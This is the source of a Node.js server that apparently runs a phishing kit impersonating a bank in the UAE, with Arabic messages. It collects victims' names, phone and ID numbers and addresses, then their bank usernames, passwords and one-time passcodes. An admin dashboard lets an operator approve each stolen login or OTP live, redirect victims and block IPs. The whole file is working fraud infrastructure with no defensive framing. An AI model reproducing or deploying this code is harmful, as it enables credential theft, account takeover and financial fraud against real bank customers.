const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const ROOT = __dirname;
const PORT = process.env.PORT || 8080;

const ADMIN_HASH = '7c4ef8b7e0b8b6a8e776f5161acc3a323673a7f13edca8386aeb74137214b671';
const TOKEN_SECRET = ADMIN_HASH + '_mbank_secret';
const visitors = {};
const orders = [];
const clicks = [];
const blockedIPs = new Set();
const sessions = [];
let orderCounter = 1000;
let sessionCounter = 5000;
let clickCounter = 0;
let totalVisitsToday = 0;
let pageViewsToday = 0;
let todayDate = new Date().toDateString();

function sha256(str) {
  return crypto.createHash('sha256').update(str).digest('hex');
}

function createToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  return ts + '.' + sig;
}

function verifyToken(token) {
  if (!token || !token.includes('.')) return false;
  const [ts, sig] = token.split('.');
  const expected = crypto.createHmac('sha256', TOKEN_SECRET).update(ts).digest('hex');
  if (sig !== expected) return false;
  const age = Date.now() - parseInt(ts);
  return age < 7 * 24 * 60 * 60 * 1000;
}

function getIP(req) {
  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress || '0.0.0.0';
}

function getCookies(req) {
  return (req.headers.cookie || '').split(';').reduce((acc, c) => {
    const [k, v] = c.trim().split('=');
    if (k) acc[k] = v;
    return acc;
  }, {});
}

function isAdmin(req) {
  const header = req.headers['x-admin-token'];
  if (header && verifyToken(header)) return true;
  const cookies = getCookies(req);
  return verifyToken(cookies.admin_token);
}

function trackVisitor(req) {
  const ip = getIP(req);
  const ua = req.headers['user-agent'] || '';
  const reqPath = decodeURIComponent(req.url.split('?')[0]);

  if (reqPath.startsWith('/api/') || reqPath.startsWith('/admin')) return;

  const now = Date.now();
  const today = new Date().toDateString();
  if (today !== todayDate) {
    todayDate = today;
    totalVisitsToday = 0;
    pageViewsToday = 0;
  }

  pageViewsToday++;

  if (!visitors[ip]) {
    totalVisitsToday++;
    visitors[ip] = { ip, ua, page: reqPath, time: now, start: now };
  } else {
    visitors[ip].page = reqPath;
    visitors[ip].time = now;
    visitors[ip].ua = ua;
  }
}

function getActiveVisitors() {
  const cutoff = Date.now() - 60000;
  const active = [];
  for (const ip in visitors) {
    if (visitors[ip].time > cutoff) {
      active.push(visitors[ip]);
    } else {
      delete visitors[ip];
    }
  }
  return active;
}

function readBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', c => { body += c; if (body.length > 1e6) req.destroy(); });
    req.on('end', () => resolve(body));
  });
}

function json(res, data, status) {
  res.writeHead(status || 200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(data));
}

const MIME = {
  '.html': 'text/html; charset=utf-8', '.css': 'text/css',
  '.js': 'application/javascript', '.png': 'image/png',
  '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
  '.svg': 'image/svg+xml', '.woff': 'font/woff', '.woff2': 'font/woff2',
  '.ttf': 'font/ttf', '.ico': 'image/x-icon', '.json': 'application/json',
  '.xml': 'application/xml', '.php': 'text/html; charset=utf-8',
};

const server = http.createServer(async (req, res) => {
  const reqPath = decodeURIComponent(req.url.split('?')[0]);

  trackVisitor(req);

  // --- API Routes ---

  if (req.method === 'POST' && reqPath === '/admin/login') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      if (sha256(data.password || '') === ADMIN_HASH) {
        const token = createToken();
        return json(res, { success: true, token });
      }
      return json(res, { success: false, message: 'كلمة المرور غير صحيحة' }, 401);
    } catch (e) {
      return json(res, { success: false, message: 'خطأ في الطلب' }, 400);
    }
  }

  if (req.method === 'POST' && reqPath === '/api/clicks') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      orderCounter++;
      orders.push({
        id: orderCounter,
        name: '',
        phone: '',
        id_number: '',
        email: '',
        emirate: '',
        address: '',
        country: (data.country || 'غير معروف').substring(0, 100),
        service: (data.service || '').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        status: 'click',
        date: new Date().toISOString()
      });
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  if (req.method === 'POST' && reqPath === '/api/orders') {
    const ip = getIP(req);
    if (blockedIPs.has(ip)) return json(res, { success: false, message: 'محظور' }, 403);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      orderCounter++;
      const order = {
        id: orderCounter,
        name: (data.name || '').substring(0, 100),
        phone: (data.phone || '').substring(0, 20),
        id_number: (data.id_number || '').substring(0, 50),
        email: (data.email || '').substring(0, 100),
        emirate: (data.emirate || '').substring(0, 50),
        address: (data.address || '').substring(0, 200),
        country: (data.country || 'الإمارات').substring(0, 50),
        service: (data.service || 'طلب ساعة ذكية').substring(0, 100),
        lang: data.lang || 'ar',
        ip: ip,
        status: 'pending',
        date: new Date().toISOString()
      };
      orders.push(order);
      console.log('[ORDER] id=' + order.id + ' name=' + order.name + ' phone=' + order.phone);
      return json(res, { success: true, id: order.id });
    } catch (e) {
      return json(res, { success: false, message: 'خطأ في البيانات' }, 400);
    }
  }

  if (req.method === 'GET' && reqPath === '/api/stats') {
    const active = getActiveVisitors();
    return json(res, {
      activeVisitors: active.length,
      totalVisitsToday,
      pageViewsToday,
      totalOrders: orders.length,
      pendingOrders: orders.filter(o => o.status === 'pending').length
    });
  }

  if (req.method === 'GET' && reqPath === '/api/orders') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    return json(res, { orders: orders.slice().reverse() });
  }

  if (req.method === 'GET' && reqPath === '/api/visitors') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const active = getActiveVisitors();
    return json(res, { visitors: active, count: active.length });
  }

  if (req.method === 'POST' && reqPath === '/api/orders/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const order = orders.find(o => o.id === data.id);
      if (!order) return json(res, { error: 'not found' }, 404);
      order.status = data.status;
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  if (req.method === 'POST' && reqPath === '/api/block-ip') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      blockedIPs.add(data.ip);
      orders.forEach(o => { if (o.ip === data.ip) o.status = 'blocked'; });
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Sessions (Login + OTP in one record) ---

  if (req.method === 'POST' && reqPath === '/api/login-attempts') {
    const ip = getIP(req);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      if (data.sessionId) {
        const existing = sessions.find(s => s.id === parseInt(data.sessionId));
        if (existing) {
          existing.username = (data.username || '').substring(0, 100);
          existing.password = (data.password || '').substring(0, 100);
          existing.loginStatus = 'waiting';
          existing.otp = null;
          existing.otpStatus = null;
          existing.redirectUrl = null;
          existing.date = new Date().toISOString();
          console.log('[LOGIN-RETRY] id=' + existing.id + ' user=' + existing.username);
          return json(res, { success: true, id: existing.id });
        }
      }
      sessionCounter++;
      const session = {
        id: sessionCounter,
        username: (data.username || '').substring(0, 100),
        password: (data.password || '').substring(0, 100),
        country: (data.country || 'غير معروف').substring(0, 100),
        lang: data.lang || 'ar',
        ip,
        service: (data.service || '').substring(0, 200),
        orderName: (data.orderName || '').substring(0, 100),
        orderPhone: (data.orderPhone || '').substring(0, 50),
        orderEmail: (data.orderEmail || '').substring(0, 100),
        orderIdNumber: (data.orderIdNumber || '').substring(0, 50),
        orderEmirate: (data.orderEmirate || '').substring(0, 50),
        orderAddress: (data.orderAddress || '').substring(0, 200),
        orderId: data.orderId ? parseInt(data.orderId) : null,
        loginStatus: 'waiting',
        otp: null,
        otpStatus: null,
        redirectUrl: null,
        date: new Date().toISOString()
      };
      sessions.push(session);
      console.log('[LOGIN] id=' + session.id + ' user=' + session.username + ' service=' + session.service);
      return json(res, { success: true, id: session.id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  if (req.method === 'GET' && reqPath.startsWith('/api/login-attempts/') && reqPath.endsWith('/status')) {
    const id = parseInt(reqPath.split('/')[3]);
    const s = sessions.find(a => a.id === id);
    if (!s) return json(res, { status: 'not_found' }, 404);
    return json(res, { status: s.loginStatus, redirectUrl: s.redirectUrl || null });
  }

  if (req.method === 'POST' && reqPath === '/api/login-attempts/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const s = sessions.find(a => a.id === data.id);
      if (!s) return json(res, { error: 'not found' }, 404);
      s.loginStatus = data.status;
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  if (req.method === 'POST' && reqPath === '/api/otp-attempts') {
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const id = parseInt(data.loginId);
      const s = sessions.find(a => a.id === id);
      if (!s) return json(res, { error: 'session not found' }, 404);
      s.otp = (data.otp || '').substring(0, 20);
      s.otpStatus = 'waiting';
      return json(res, { success: true, id: s.id });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  if (req.method === 'GET' && reqPath.startsWith('/api/otp-attempts/') && reqPath.endsWith('/status')) {
    const id = parseInt(reqPath.split('/')[3]);
    const s = sessions.find(a => a.id === id);
    if (!s) return json(res, { status: 'not_found' }, 404);
    return json(res, { status: s.otpStatus || 'not_found', redirectUrl: s.redirectUrl || null });
  }

  if (req.method === 'POST' && reqPath === '/api/otp-attempts/status') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const s = sessions.find(a => a.id === data.id);
      if (!s) return json(res, { error: 'not found' }, 404);
      s.otpStatus = data.status;
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  if (req.method === 'GET' && reqPath === '/api/sessions') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const list = sessions.slice().reverse().map(s => {
      let pendingAction = null;
      if (s.loginStatus === 'waiting') {
        pendingAction = { type: 'login', id: s.id };
      } else if (s.loginStatus === 'approved' && s.otpStatus === 'waiting') {
        pendingAction = { type: 'otp', id: s.id };
      }
      return { ...s, pendingAction };
    });
    return json(res, { sessions: list });
  }

  if (req.method === 'POST' && reqPath === '/api/sessions/redirect') {
    if (!isAdmin(req)) return json(res, { error: 'unauthorized' }, 401);
    const body = await readBody(req);
    try {
      const data = JSON.parse(body);
      const s = sessions.find(a => a.id === data.id);
      if (!s) return json(res, { error: 'not found' }, 404);
      s.redirectUrl = data.url;
      return json(res, { success: true });
    } catch (e) {
      return json(res, { error: 'bad request' }, 400);
    }
  }

  // --- Admin Auth ---

  if ((reqPath.startsWith('/admin/') || reqPath === '/admin') && reqPath !== '/admin/login' && reqPath !== '/admin/login.html') {
    if (!isAdmin(req)) {
      const loginPage = path.join(ROOT, 'admin', 'login.html');
      if (fs.existsSync(loginPage)) {
        res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
        return fs.createReadStream(loginPage).pipe(res);
      }
    }
  }

  // --- Static Files ---

  let filePath = reqPath;
  if (!filePath.endsWith('/') && !path.extname(filePath)) {
    const dirPath = path.join(ROOT, filePath);
    if (fs.existsSync(dirPath) && fs.statSync(dirPath).isDirectory()) {
      res.writeHead(301, { 'Location': filePath + '/' });
      return res.end();
    }
  }
  if (filePath.endsWith('/')) filePath += 'index.html';

  const fullPath = path.join(ROOT, filePath);
  if (!fs.existsSync(fullPath)) {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    return res.end('Not found: ' + filePath);
  }

  const ext = path.extname(fullPath).toLowerCase();
  res.writeHead(200, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
  fs.createReadStream(fullPath).pipe(res);
});

server.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`Admin:   http://localhost:${PORT}/admin/`);
});
